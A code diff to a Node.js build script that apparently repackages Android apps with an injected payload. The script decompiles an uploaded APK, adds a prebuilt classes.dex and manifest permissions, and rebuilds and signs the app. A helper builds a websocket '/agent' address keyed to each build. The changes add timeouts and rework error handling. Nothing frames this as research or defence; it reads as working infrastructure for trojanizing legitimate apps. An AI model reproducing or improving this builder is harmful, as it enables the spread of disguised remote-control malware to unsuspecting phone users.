@@ -8,6 +8,7 @@ const db = require('./db');
 const APK_DIR = process.env.APK_DIR || path.join(__dirname, '..', 'apks');
 const DEX = path.join(__dirname, '..', 'payload', 'build', 'classes.dex');
 const MAXBUF = 1 << 26;
+const TIMEOUT = 300000;
 
 const PERMS = [
   'android.permission.INTERNET',
@@ -59,6 +60,8 @@ function wsUrl(buildId, secret) {
   return `${base.replace(/^http/, 'ws')}/agent?b=${buildId}&k=${secret}`;
 }
 
+const tool = (name) => path.join(process.env.BUILD_TOOLS || '/usr/bin', name);
+
 async function build({ buildId, inputApk, name }) {
   const work = path.join('/tmp', 'arpit-build', buildId);
   const src = path.join(work, 'src');
@@ -66,22 +69,15 @@ async function build({ buildId, inputApk, name }) {
   const aligned = path.join(work, 'aligned.apk');
   const finalApk = path.join(APK_DIR, `${buildId}.apk`);
 
-  const fail = (e) => {
-    const msg = (e && (e.stderr || e.message)) || 'unknown';
-    try {
-      db.prepare("UPDATE builds SET status='failed', err=? WHERE id=?")
-        .run(String(msg).slice(-2000), buildId);
-    } catch {}
-  };
-
   try {
-    if (!fs.existsSync(DEX)) throw new Error('payload/build/classes.dex missing — pehle `npm run payload` chalao');
-    if (!process.env.BUILD_TOOLS || !process.env.KEYSTORE) throw new Error('BUILD_TOOLS / KEYSTORE env missing (Android SDK is host pe nahi hai)');
+    if (!fs.existsSync(DEX)) throw new Error('payload/build/classes.dex missing');
+    if (!process.env.KEYSTORE || !fs.existsSync(process.env.KEYSTORE)) throw new Error('keystore missing: ' + process.env.KEYSTORE);
+    if (!process.env.BUILD_TOOLS) throw new Error('BUILD_TOOLS set nahi hai');
 
     fs.mkdirSync(APK_DIR, { recursive: true });
     fs.mkdirSync(work, { recursive: true });
 
-    await run('apktool', ['d', '-f', '--use-aapt2', '-o', src, inputApk], { maxBuffer: MAXBUF });
+    await run('apktool', ['d', '-f', '--use-aapt2', '-o', src, inputApk], { maxBuffer: MAXBUF, timeout: TIMEOUT });
 
     const manifestPath = path.join(src, 'AndroidManifest.xml');
     const xml = fs.readFileSync(manifestPath, 'utf8');
@@ -111,20 +107,24 @@ async function build({ buildId, inputApk, name }) {
     fs.writeFileSync(manifestPath, patchManifest(xml, pkg));
     db.prepare('UPDATE builds SET pkg=?, label=? WHERE id=?').run(pkg, label, buildId);
 
-    await run('apktool', ['b', src, '-o', out], { maxBuffer: MAXBUF });
-    await run(path.join(process.env.BUILD_TOOLS, 'zipalign'), ['-f', '4', out, aligned]);
-    await run(path.join(process.env.BUILD_TOOLS, 'apksigner'), [
+    await run('apktool', ['b', src, '-o', out], { maxBuffer: MAXBUF, timeout: TIMEOUT });
+    await run(tool('zipalign'), ['-f', '4', out, aligned], { maxBuffer: MAXBUF, timeout: 60000 });
+    await run(tool('apksigner'), [
       'sign',
       '--ks', process.env.KEYSTORE,
       '--ks-pass', `pass:${process.env.KS_PASS}`,
       '--ks-key-alias', process.env.KS_ALIAS,
       '--out', finalApk, aligned
-    ], { maxBuffer: MAXBUF });
+    ], { maxBuffer: MAXBUF, timeout: 120000 });
 
     db.prepare("UPDATE builds SET status='ready', size=? WHERE id=?")
       .run(fs.statSync(finalApk).size, buildId);
   } catch (e) {
-    fail(e);
+    const msg = (e && (e.stderr || e.message)) || 'unknown';
+    try {
+      db.prepare("UPDATE builds SET status='failed', err=? WHERE id=?")
+        .run(String(msg).slice(-2000), buildId);
+    } catch {}
   } finally {
     fs.rm(work, { recursive: true, force: true }, () => {});
     fs.rm(inputApk, { force: true }, () => {});
